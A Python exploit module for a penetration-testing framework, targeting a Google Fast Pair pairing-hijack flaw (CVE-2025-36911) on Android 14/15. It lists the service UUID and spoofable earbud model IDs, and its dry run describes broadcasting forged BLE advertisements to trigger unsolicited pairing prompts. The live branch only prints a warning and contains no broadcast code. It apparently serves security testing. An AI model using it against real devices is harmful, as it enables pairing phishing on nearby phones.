"""WhisperPair — Google Fast Pair Unauthenticated Pairing Hijack (CVE-2025-36911).

Google Fast Pair (GFPS) implementation on certain Android 14/15 devices does
not properly validate BLE advertisement authenticity before initiating a
pairing request.  A nearby attacker can replay a captured GFPS advertisement
to trigger an unsolicited pairing dialog on the victim's device (pairing
phishing / UX hijack).

CVSS: 6.5 Medium | AV:A/AC:L/PR:N/UI:R

Original research / PoC credits
--------------------------------
CVE     : CVE-2025-36911
CVSS    : 6.5 (Medium)
Source  : WirelessXPL-Forge wirelessxpl/modules/generic/bluetooth/
          whisperpair_fast_pair_cve_2025_36911.py

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

from embedxpl.core.exploit import *


_CVE = "CVE-2025-36911"

# Google Fast Pair service UUID and known model IDs
_GFPS_SERVICE_UUID = "0000FE2C-0000-1000-8000-00805F9B34FB"
_POPULAR_MODEL_IDS = {
    "AirPods Pro 2": b"\x20\x00\xf0",
    "Pixel Buds A": b"\x55\xad\xef",
    "Samsung Galaxy Buds2": b"\x2d\x7a\x23",
}


class Exploit(Exploit):
    """WhisperPair Fast Pair Pairing Hijack (CVE-2025-36911)."""

    __info__ = {
        "name": "WhisperPair Google Fast Pair Hijack (CVE-2025-36911)",
        "description": (
            "Google Fast Pair (GFPS) on Android 14/15 does not validate advertisement "
            "authenticity before triggering pairing dialog. Attacker replays a known "
            "GFPS advertisement to pop unsolicited pairing prompts on nearby Android "
            "devices. CVSS 6.5 (Medium). BLE proximity required."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.cve.org/CVERecord?id=CVE-2025-36911",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-36911",
            "https://developers.google.com/nearby/fast-pair/specifications",
        ),
        "devices": ("Android 14/15 devices with Fast Pair enabled",),
    }

    target_model = OptString("AirPods Pro 2", f"Spoofed device model: {', '.join(_POPULAR_MODEL_IDS)}")
    scan_time = OptInteger(15, "BLE scan duration to find targets (seconds)")
    dry_run = OptBool(True, "Dry run — describe attack only")

    @mute
    def check(self) -> bool:
        return True

    def run(self) -> None:
        model = str(self.target_model)
        dry_run = bool(self.dry_run)
        model_id = _POPULAR_MODEL_IDS.get(model, b"\x20\x00\xf0")

        print_status(f"WhisperPair Fast Pair attack — {_CVE}")
        print_info(f"Spoofed model: {model} (model_id: {model_id.hex()})")
        print_info("Trigger: broadcast GFPS BLE advertisement → Android shows pairing dialog")

        if dry_run:
            print_info(
                f"DRY-RUN: Would broadcast BLE advertisement with GFPS service UUID "
                f"({_GFPS_SERVICE_UUID}) and model ID {model_id.hex()} to trigger "
                f"pairing dialog on nearby Android 14/15 devices. "
                f"Requires: Linux + BlueZ hcitool/btmgmt or Python bleak/btvid."
            )
        else:
            print_warning(
                f"Live BLE advertisement for {_CVE}. "
                "Use WirelessXPL-Forge whisperpair module for full BlueZ integration."
            )
